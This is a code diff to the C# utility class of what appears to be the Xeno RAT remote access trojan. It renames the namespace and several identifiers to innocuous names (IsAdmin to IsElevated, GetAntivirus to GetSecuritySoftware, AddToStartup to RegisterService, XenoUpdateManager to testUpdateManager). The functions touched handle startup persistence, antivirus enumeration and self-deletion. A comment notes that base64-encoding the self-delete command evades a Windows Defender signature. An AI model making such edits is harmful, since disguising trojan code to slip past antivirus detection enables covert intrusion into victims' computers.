@@ -15,7 +15,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Xml.Linq;
 
-namespace xeno_rat_client
+namespace test_rat_client
 {
     public class Utils
     {
@@ -85,7 +85,7 @@ namespace xeno_rat_client
             return strTitle;
         }
 
-        public static bool IsAdmin()
+        public static bool IsElevated()
         {
             bool admin = false;
             try
@@ -95,7 +95,7 @@ namespace xeno_rat_client
             catch { }
             return admin;
         }
-        public static string GetAntivirus()
+        public static string GetSecuritySoftware()
         {
             List<string> antivirus = new List<string>();
             try
@@ -189,7 +189,7 @@ namespace xeno_rat_client
         {
             await Task.Run(() =>
             {
-                if (Utils.IsAdmin())
+                if (Utils.IsElevated())
                 {
                     try
                     {
@@ -266,7 +266,7 @@ namespace xeno_rat_client
         }
         public async static Task Uninstall() 
         {
-            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
+            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the testRat windows defender sig
             await RemoveStartup(Assembly.GetEntryAssembly().Location);
             Process.Start(new ProcessStartInfo()
             {
@@ -278,7 +278,7 @@ namespace xeno_rat_client
             Process.GetCurrentProcess().Kill();
         }
 
-        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
+        public async static Task<bool> RegisterServiceNonAdmin(string executablePath, string name= "testUpdateManager")
         {
             return await Task.Run(() =>
                    {
@@ -297,7 +297,7 @@ namespace xeno_rat_client
                         }
                    });
         }
-        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
+        public static async Task<bool> RegisterServiceAdmin(string executablePath, string name = "testUpdateManager")
         {
             try
             {
